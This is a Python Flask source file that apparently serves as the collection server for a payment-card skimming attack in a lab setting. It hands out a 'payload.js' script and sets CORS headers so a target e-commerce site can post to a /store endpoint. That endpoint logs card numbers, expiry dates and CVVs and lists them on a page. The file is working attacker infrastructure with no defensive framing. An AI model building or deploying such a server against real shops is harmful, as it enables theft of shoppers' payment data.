from flask import Flask, render_template, request, redirect, url_for, make_response, jsonify
from flask_cors import CORS

ECOMMERCE_IP = "http://192.168.8.107:5000" ## REPLACE W WEB SERVER IP

app = Flask(__name__)
app.config['SECRET_KEY'] = 'nospecialword'
app.jinja_env.globals.update(min=min)

CORS(app, resources={r"/store": {"origins": ECOMMERCE_IP}}, supports_credentials=True)
app.config['CORS_HEADERS'] = 'Content-Type'

cards = [
    {
        'number': '4111111111111111',
        'expiry': '12/25',
        'cvv': '123'
    }
]

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/payload')
def payload():
    return redirect(url_for('static', filename='payload.js'))

@app.route('/store', methods=['OPTIONS', 'GET', 'POST'])
def store():
    if request.method == 'OPTIONS': #handle preflight CORS request
        response = make_response()
        response.headers["Access-Control-Allow-Origin"] = ECOMMERCE_IP
        response.headers["Access-Control-Allow-Methods"] = "OPTIONS, GET, POST"
        response.headers["Access-Control-Allow-Headers"] = "Content-Type"
        return response, 204 # no content

    if request.method == 'POST':
        card = request.get_json()
        print("DEBUG::::: ", card)
        cards.append(card)

        # add CORS headers to response
        response = make_response(jsonify({"message": "Data stored"}), 200)
        response.headers["Access-Control-Allow-Origin"] = ECOMMERCE_IP
        response.headers["Access-Control-Allow-Methods"] = "GET, POST"
        response.headers["Access-Control-Allow-Headers"] = "Content-Type"
        return response

    # GET response
    response = make_response(render_template('store.html', cards=cards))
    response.headers["Access-Control-Allow-Origin"] = ECOMMERCE_IP
    return response

if __name__ == '__main__':
    app.run(debug=True, port=8888, host="0.0.0.0")
